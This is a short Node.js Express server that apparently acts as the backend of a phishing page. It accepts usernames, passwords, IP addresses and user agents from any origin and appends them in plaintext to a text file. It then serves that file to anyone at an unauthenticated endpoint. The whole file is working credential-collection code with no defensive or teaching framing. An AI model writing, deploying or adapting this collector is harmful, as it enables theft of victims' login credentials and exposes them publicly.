const express = require('express');
const logger = require("morgan");
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs'); // Import the File System module
const path = require('path'); // Import path module for file handling
const port = process.env.PORT || 3000;

const app = express();

// Use CORS middleware
app.use(cors({
    origin: '*', // Allow all origins; change this for production
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'X-Requested-With'],
    credentials: true
}));

app.use(logger("dev"));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Endpoint to receive form data
app.post('/api/saveData', (req, res) => {
    console.log("Received data:", req.body); // Debug log
    const { username, password, ip, userAgent } = req.body;

    // Save data to a text file
    saveDataToFile(username, password, ip, userAgent, (error) => {
        if (error) {
            console.error("Error saving data to file:", error); // Log error
            return res.status(500).json({ message: 'Error saving data', error });
        }
        res.status(200).json({ message: 'Data saved to file successfully!' });
    });
});

// Function to save data to a text file
function saveDataToFile(username, password, ip, userAgent, callback) {
    const dataToSave = `Username: ${username}\nPassword: ${password}\nIP Address: ${ip}\nUser Agent: ${userAgent}\n\n`;
    const filePath = path.join(__dirname, 'formData.txt'); // Define the path for the text file

    // Append data to the file
    fs.appendFile(filePath, dataToSave, (error) => {
        callback(error); // Call the callback with any error that occurred
    });
}

// Endpoint to serve the text file
app.get('/api/formData.txt', (req, res) => {
    const filePath = path.join(__dirname, 'formData.txt'); // Define the path for the text file
    res.sendFile(filePath, (error) => {
        if (error) {
            console.error("Error sending file:", error); // Log error if file is not sent
            res.status(500).send('Error retrieving file.');
        }
    });
});

// Start the server
app.listen(port, () => {
    console.log(`Running on Port ${port}`);
});
